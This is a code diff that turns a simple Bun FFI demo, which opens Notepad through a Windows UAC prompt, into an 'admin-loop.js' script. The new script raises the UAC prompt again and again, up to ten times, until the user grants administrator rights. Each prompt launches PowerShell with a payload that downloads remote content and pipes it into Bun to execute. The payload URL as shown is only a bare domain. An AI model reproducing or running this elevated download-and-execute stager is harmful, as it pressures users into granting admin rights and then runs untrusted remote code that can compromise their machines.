@@ -1,35 +1,50 @@
-import { dlopen, FFIType, ptr } from "bun:ffi";
+// admin-loop.js
+const { dlopen, FFIType, ptr } = require("bun:ffi");
 
-// 1. Подключаем системную библиотеку shell32.dll
 const shell32 = dlopen("shell32.dll", {
   ShellExecuteW: {
-    // Параметры: hwnd, operation, file, parameters, directory, showCmd
     args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
-    returns: FFIType.ptr,
+    returns: FFIType.i32,
   },
 });
 
-// Функция для перевода строки в формат UTF-16 (нужен для Windows API)
-function toPtr(str: string) {
-  return ptr(Buffer.from(str + "\0", "utf16le"));
+const toPtr = (str) => ptr(Buffer.from(str + "\0", "utf16le"));
+
+async function isAdmin() {
+  const proc = Bun.spawn({ cmd: ["net", "session"], stdout: "pipe", stderr: "pipe" });
+  return (await proc.exited) === 0;
 }
 
-console.log("⏳ Вызываем окно UAC через FFI...");
-
-// 2. Вызываем ShellExecuteW с глаголом "runas"
-// "runas" — это стандартная команда Windows для запуска с повышением прав
-const result = shell32.symbols.ShellExecuteW(
-  0,                  // Простой дескриптор окна
-  toPtr("runas"),     // Глагол (действие): запуск от админа
-  toPtr("notepad.exe"), // Что запускаем
-  0,                  // Аргументы (нет)
-  0,                  // Рабочая директория (по умолчанию)
-  1                   // SW_SHOWNORMAL (показать окно)
-);
-
-// Если результат > 32, значит запуск прошел успешно
-if (Number(result) > 32) {
-  console.log("✅ Успех! Блокнот запущен с правами администратора.");
-} else {
-  console.log("❌ Ошибка или пользователь нажал 'Нет' в окне UAC. Код:", result);
+async function main() {
+  console.log("🚀 PID:", process.pid);
+  
+  for (let i = 1; i <= 10; i++) {
+    console.log(`\n=== Попытка ${i}/10 ===`);
+    
+    if (await isAdmin()) {
+      console.log("✅ АДМИН! Payload...");
+      const whoami = Bun.spawn({ cmd: ["whoami"], stdout: "pipe" });
+      console.log("whoami:", (await new Response(whoami.stdout).text()).trim());
+      return;
+    }
+    
+    console.log("❌ Не админ. Запрашиваем UAC...");
+    
+    // ВНИМАНИЕ: Так как мы в памяти, передаем команду выполнения напрямую в UAC
+    const payload = `(iwr 'https://githubusercontent.com').Content | bun -`;
+    
+    const result = shell32.symbols.ShellExecuteW(
+      0,
+      toPtr("runas"),
+      toPtr("powershell.exe"),
+      toPtr("-Command " + payload),
+      0,
+      1
+    );
+    
+    console.log("ShellExecuteW:", result);
+    await new Promise(r => setTimeout(r, 5000));
+  }
 }
+
+main().catch(console.error);
